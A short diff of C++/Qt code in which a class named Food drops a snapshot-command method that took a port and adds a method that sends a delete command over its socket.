@@ -49,11 +49,10 @@ void Food::sendCmdOffline()
     mSock->write(codec->fromUnicode(data));
 }
 
-void Food::sendCmdSnapshoot(int port)
+void Food::sendCmdDelete()
 {
     QString data;
-    data.append(CmdSnapshoot+CmdSplit);
-    data.append("PORT"+CmdSplit+QString::number(port));
+    data.append(CmdDelete+CmdSplit);
     data.append(CmdEnd);
     mSock->write(codec->fromUnicode(data));
 }
